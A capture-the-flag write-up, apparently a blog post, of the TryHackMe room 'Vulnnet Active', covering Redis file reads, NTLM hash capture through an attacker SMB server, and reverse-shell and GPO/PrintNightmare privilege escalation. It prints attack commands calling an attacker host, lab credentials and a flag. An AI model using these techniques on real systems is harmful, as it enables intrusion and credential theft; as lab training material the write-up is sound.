---
title: Vulnnet Active
date: 2025-04-26 00:00:00 +/-TTTT
categories:
  - Practice
  - Tryhackme - Active Directory
tags:
  - nc
  - redis-cli
  - lfi
  - llmnr-poisoning
  - responder
  - autologon-credentials
  - runas
  - genericwrite
  - sharpgpoabuse
  - impacket-rpcdump
  - printnightmare
  - impacket-psexec
image: preview-image.png
media_subpath: /assets/img/Practice/Tryhackme - Active Directory/2025-05-31-vulnnet-active/
---

Vulnnet Active is a Windows machine running Active Directory with an instance of Redis that doesn’t require authentication. This can be leveraged to run a command that attempts to authenticate to a Responder SMB server, resulting in the interception of an NTLMv2 hash of a user. After cracking the hash, the credentials can be used to authenticate to an SMB share that contains a PowerShell script which can be overwritten with a reverse shell script. Once on the system, enumeration can reveal two different paths to privilege escalation: one is by running a PrintNightmare exploit, and the other is by exploiting a Group Policy Object misconfiguration; both methods result in a system shell.

## Enumeration

### Nmap

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -p 53,135,139,464,445,6379,9389,49668,49665,49669,49670,49683 -Pn -A 10.10.219.138
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-07 09:03 PDT
Nmap scan report for 10.10.219.138
Host is up (0.20s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-06-07T16:04:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.14 seconds
```

* found nothing on DNS, SMB and RPC.

### Redis

* we can here try manual enumeration.
* to connect to redis we can use redis-cli or nc.

```
nc -vn 10.10.10.10 6379
```

* a whole bunch of information came out.
* which should not be the case according to [this](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis).
* meaning it unauthenticated.
* using another command we found shows us the redis installed directory.

```
config get *

---snip---
$10
appendonly
$2
no
$3
dir
$57
C:\Users\enterprise-security\Downloads\Redis-x64-2.8.2402
$16
---snip---
```

* We found a username on the system with that entry!
* nmap script scan.

```
┌──(kali㉿kali)-[~/Desktop/Vulnnet_Active/redis-rogue-server]
└─$ nmap --script redis-info -sV -Pn -p 6379 10.10.230.135
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-07 10:15 PDT
Nmap scan report for 10.10.230.135
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 2.8.2402 (64 bits)
| redis-info: 
|   Version: 2.8.2402
|   Operating System: Windows  
|   Architecture: 64 bits
|   Process ID: 2328
|   Used CPU (sys): 0.70
|   Used CPU (user): 0.72
|   Connected clients: 3
|   Connected slaves: 0
|   Used memory: 965.20K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|   Client connections: 
|_    10.8.70.87

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds
```

## Exploitation

* Exploitation of Redis
* Going through the HackTricks list, we find an article that shows how to exploit earlier versions of Redis (our version 2.8.2402 is amongst them):
* [https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#lua-sandbox-bypass](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#lua-sandbox-bypass)
* [https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html)
*   [https://medium.com/@d.bougioukas/red-team-diary-entry-2-stealthily-backdooring-cms-through-redis-memory-space-5813c62f8add](https://medium.com/@d.bougioukas/red-team-diary-entry-2-stealthily-backdooring-cms-through-redis-memory-space-5813c62f8add)

    “Redis can execute Lua scripts (in a sandbox, more on that later) via the “EVAL” command. The sandbox allows the dofile() command (WHY???). It can be used to enumerate files and directories. No specific privilege is needed by Redis… If the Lua script is syntaxically invalid or attempts to set global variables, the error messages will leak some content of the target file”
* Interesting. So let’s try if we can read some files using this technique.
* As explained in the linked article, the command we use is the following:

```
┌──(kali㉿kali)-[~/THM/rooms/vulnnet_active]
└─$ redis-cli -h 10.10.245.19 eval "dofile('<PATH TO FILE>')" 0
```

```
┌──(kali㉿kali)-[~/Desktop/Vulnnet_Active]
└─$ redis-cli -h 10.10.92.114 eval "dofile('\etc\passwd')" 0
(error) ERR Error running script (call to f_1225324a662a8af63fdfd1fc984393c32d11b9a0): @user_script:1: cannot open etcpasswd: No such file or directory
```

* The problem hereby is: we don’t know what we are looking for nor do we know if this technique actually works.
* So we try to find some common files first, so that we can definitely confirm that it works.
* Therefore, we try some of the [common windows files](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt) that are usually used for Local File Inclusion.
* Here, we can clearly see that depending on the file, we get different error messages!
* Apparently we can’t read high privilege files.
* Thus the assumption is that we are not executing commands as high privileged user.
* The first hit we get when trying to read the hosts file.
* The error is unexpected symbol near `#…`
* That’s the symbol on the very first line of a typical hosts file. So this seems promising.
* Further, we know that there is a user called `enterprise-security` (we saw that in redis configs).
* What if the user has the user.txt file on his/her Desktop?
* It works! We just dumped the user flag. Now we can definitely confirm that the technique works.
* But what can we do with it?
* as here we see we can read file, but lets check if we can read file from smb share.
* because if we can, then we will be able to perform LLMNR poisoning attack.

> LLMNR Poisoning attack is nothing but when a user try to access a remote share. This would leak the NTLM hash of the user as he/she tries to authenticate himself/herself. If this remote share is on our machine, we could attempt to log the access and thus get access to the hash.

* thus to check this we can start our smb server using impacket and from redis-cli we can query a file from our smb server.
* next we wait and see if we get any request on our smb server.
* and just like that we eventually performed LLMNR poisoning attack as we got the hash.
* NOTE: we can also perfrom this attack using responder.

```
┌──(kali㉿kali)-[~/THM/rooms/vulnnet_active] 
└─$ sudo responder -I tun0
```

```
┌──(kali㉿kali)-[~/THM/rooms/vulnnet_active]
└─$ redis-cli -h 10.10.245.19 eval "dofile('//10.11.60.43/test')" 0
```

* now we can easily crack this has using john.
* just put the hash string in a file and give it to john with a wordlist.
* We now have valid credentials `enterprise-security:sand_0873959498`
* now that we have a user creds we can enumerate SMB share with access check.
* on Enterprise-Share we have a powershell script.
* the script seems to be removing everything from `C:\Users\Public\Documents\` folder and suppressing any errors.
* as it seems, this might be running in a timely manner on target system.
* thus lets check if we can put files on Enterprise-Share as if we can, we would be able to replace this original powershell script with our malicious one.
* and we see we are able to do put files on this share.
* thus lets create a maclicious script.
* for this i took a powershell rev shell command from `https://www.revshells.com/`.
* and next appended it to the original file and put it on the share.
* now lets start a listener and wait.
* after a few seconds we did get a shell but it still as enterprise-security user.
* NOTE: on second time spawnig a shell we found that its an event based task. thus it need to wait for the event of redis eval dofile to occur give back us a rev shell.

## Post Exploitation

* current user Download direcotry the last modified time is diff. then other.
* thus looking into it we found 3 file in there.
* Looking at the files in the directory we land in shows us a file called startup.bat which has the following inside of it:

```
:home 
TIMEOUT /T 30 /NOBREAK 

powershell.exe -File C:\Enterprise-Share\PurgeIrrelevantData_1826.ps1

TIMEOUT /T 30

cls 
Goto :home
```

* That explains how the powershell script we exploited gets run, and where any files we upload via SMB get stored.
* next ran winpeas.exe and found we have autologon credentials on target.
* next to check and see what user credentials are saved for autologon we will user following command.

```
cmdkey /list
```

* Yayy its of Administrator.
* [https://steflan-security.com/windows-privilege-escalation-credential-harvesting/](https://steflan-security.com/windows-privilege-escalation-credential-harvesting/)
* but here as we know we cannot extract this credentials but use a windows utitlity called runas to run command as diff. user by giving in their creds.

```powershell
runas /savecred /user:VULNNET\Administrator “\\10.8.70.87\share\rev.exe”
```

### Bloodhound

* Time for something more powerful: SharpHound and BloodHound!
* After uploading and running SharpHound.exe, we transfer the generated .zip file back to our local machine.
* Then, we use BloodHound to analyse the found data: Immediately
* BloodHound gives us the shortest path from our current user enterprise-security to the Administrator.
* Apparently, we do have `GenericWrite` Permissions to one of the `GPOs` - namely `security-pol-vn`.
* Luckily for us, there are several tools that help us with exploiting this. We decided to use the tool [SharpGPOAbuse.exe](https://github.com/FSecureLABS/SharpGPOAbuse).
* with this we can add our current user to Administrators group.

```powershell
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "babbadeckl_privesc" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
```

* Once executed, we only have to run the following command to update the permissions:

```
gpupdate \force
```

* Now we can access the Administrator via SMB.
* Final step is to obtain the sytem flag.

### PrintNightmare

* To identify and for vulnerablility.
* I check to see if PrintNightmare is a possibility on the server
* and it is, so once we establish a foothold we can likely use this to escalate our privileges:

```bash
impacket-rpcdump 10.10.196.146 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-RPRN]: Print System Remote Protocol 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
```

* We saw earlier that this system was vulnerable to PrintNightmare so let’s make use of that. I’ll use [this powershell version of it](https://github.com/calebstewart/CVE-2021-1675).
* After downloading the exploit I upload it to the SMB share under the name PrintNightmare.ps1.
* Checking `net users` shows us the following users on the system:

```
User accounts for \\VULNNET-BC3TCK1

-------------------------------------------------------------------------------
Administrator            enterprise-security      Guest
jack-goldenhand          krbtgt                   tony-skid
```

* I change over to the C:\Enterprise-Share directory and run:

```bash
Import-Module .\PrintNightmare.ps1
Invoke-Nightmare
```

* again Checking `net users`:

```bash
User accounts for \\VULNNET-BC3TCK1

-------------------------------------------------------------------------------
adm1n                    Administrator            enterprise-security      
Guest                    jack-goldenhand          krbtgt                   
tony-skid
```

* And now our new user `adm1n` has been created.
* And checking net localgroup administrators shows us it’s a member of the administrators group:

```bash
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
adm1n
Administrator
Domain Admins
Enterprise Admins
```

* Now let’s login to the newly created user which will have a default password of `P@ssw0rd` according to the GitHub repository we downloaded the script from.
* I’ll use impacket-psexec for this:

```
impacket-psexec adm1n@10.10.196.146

Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.196.146.....
[*] Found writable share ADMIN$
[*] Uploading file IprZFyyS.exe
[*] Opening SVCManager on 10.10.196.146.....
[*] Creating service SEsl on 10.10.196.146.....
[*] Starting service SEsl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1757]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

* And we’re in as admin! Let’s go get our final flag on the desktop of administrator:

```
THM{d540c0645975900e5bb9167aa431fc9b}
```
